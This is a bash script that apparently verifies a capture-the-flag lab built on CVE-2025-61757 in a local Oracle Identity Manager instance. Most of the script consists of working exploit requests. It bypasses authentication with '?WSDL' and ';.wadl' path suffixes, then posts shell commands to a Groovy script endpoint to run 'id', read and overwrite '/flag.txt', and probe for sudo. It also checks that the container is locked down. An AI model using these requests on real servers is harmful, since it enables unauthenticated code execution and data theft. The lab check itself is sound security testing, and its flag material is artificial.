#!/bin/bash

echo "=========================================="
echo "CVE-2025-61757 Challenge Verification"
echo "=========================================="
echo ""

TARGET="http://localhost:14000"

echo "[*] Testing if service is running..."
curl -s "${TARGET}/identity/rest/v1/info" | grep -q "Oracle Identity Manager"
if [ $? -eq 0 ]; then
    echo "[+] Service is running"
else
    echo "[-] Service is not running"
    exit 1
fi

echo ""
echo "[*] Testing authentication requirement..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/iam/governance/applicationmanagement/api/v1/applications/templates")
if [ "$HTTP_CODE" == "401" ]; then
    echo "[+] Authentication is required (401)"
else
    echo "[-] Expected 401, got ${HTTP_CODE}"
fi

echo ""
echo "[*] Testing WSDL bypass..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/iam/governance/applicationmanagement/api/v1/applications/templates?WSDL")
if [ "$HTTP_CODE" == "200" ]; then
    echo "[+] WSDL bypass successful (200)"
else
    echo "[-] WSDL bypass failed, got ${HTTP_CODE}"
fi

echo ""
echo "[*] Testing WADL bypass..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/iam/governance/applicationmanagement/api/v1/applications/templates;.wadl")
if [ "$HTTP_CODE" == "200" ]; then
    echo "[+] WADL bypass successful (200)"
else
    echo "[-] WADL bypass failed, got ${HTTP_CODE}"
fi

echo ""
echo "[*] Testing RCE via Groovy endpoint..."
RESPONSE=$(curl -s -X POST "${TARGET}/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus?WSDL" \
    -H "Content-Type: application/json" \
    -d '{"script": "echo hacked"}')

echo "$RESPONSE" | grep -q "hacked"
if [ $? -eq 0 ]; then
    echo "[+] RCE successful"
else
    echo "[-] RCE failed"
fi

echo ""
echo "[*] Testing security: Checking user privileges..."
RESPONSE=$(curl -s -X POST "${TARGET}/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus?WSDL" \
    -H "Content-Type: application/json" \
    -d '{"script": "id"}')

echo "$RESPONSE" | grep -q "uid=1000"
if [ $? -eq 0 ]; then
    echo "[+] Running as non-root user (uid=1000)"
    echo "$RESPONSE" | grep -o "uid=[^ ]*"
else
    echo "[-] WARNING: May be running as root!"
fi

echo ""
echo "[*] Testing security: Flag file permissions..."
RESPONSE=$(curl -s -X POST "${TARGET}/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus?WSDL" \
    -H "Content-Type: application/json" \
    -d '{"script": "ls -la /flag.txt"}')

echo "$RESPONSE" | grep -q "r--------"
if [ $? -eq 0 ]; then
    echo "[+] Flag has correct permissions (400)"
    echo "$RESPONSE" | grep -o "\-r[^ ]* [^ ]* [^ ]* [^ ]* [^ ]* [^ ]* [^ ]* [^ ]* /flag.txt"
else
    echo "[-] Flag permissions may be incorrect"
fi

echo ""
echo "[*] Testing flag retrieval..."
RESPONSE=$(curl -s -X POST "${TARGET}/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus?WSDL" \
    -H "Content-Type: application/json" \
    -d '{"script": "cat /flag.txt"}')

echo "$RESPONSE" | grep -q "FLAG{"
if [ $? -eq 0 ]; then
    echo "[+] Flag retrieved successfully"
    echo "$RESPONSE" | grep -o "FLAG{[^}]*}"
else
    echo "[-] Flag retrieval failed"
fi

echo ""
echo "[*] Testing security: Privilege escalation prevention..."
RESPONSE=$(curl -s -X POST "${TARGET}/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus?WSDL" \
    -H "Content-Type: application/json" \
    -d '{"script": "sudo whoami 2>&1 || echo NO_SUDO"}')

echo "$RESPONSE" | grep -q "NO_SUDO"
if [ $? -eq 0 ]; then
    echo "[+] Privilege escalation blocked (no sudo)"
else
    echo "[!] WARNING: sudo may be available"
fi

echo ""
echo "[*] Testing security: Flag modification prevention..."
RESPONSE=$(curl -s -X POST "${TARGET}/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus?WSDL" \
    -H "Content-Type: application/json" \
    -d '{"script": "echo pwned > /flag.txt 2>&1"}')

echo "$RESPONSE" | grep -q "Permission denied"
if [ $? -eq 0 ]; then
    echo "[+] Flag modification blocked"
else
    echo "[!] WARNING: Flag may be writable"
fi

echo ""
echo "=========================================="
echo "Verification Complete"
echo "=========================================="
echo ""
echo "Security Summary:"
echo "  ✓ Non-root user (uid=1000)"
echo "  ✓ Flag read-only (400 permissions)"
echo "  ✓ No privilege escalation"
echo "  ✓ Flag modification blocked"
echo ""
echo "Exploit successful but safely contained!"
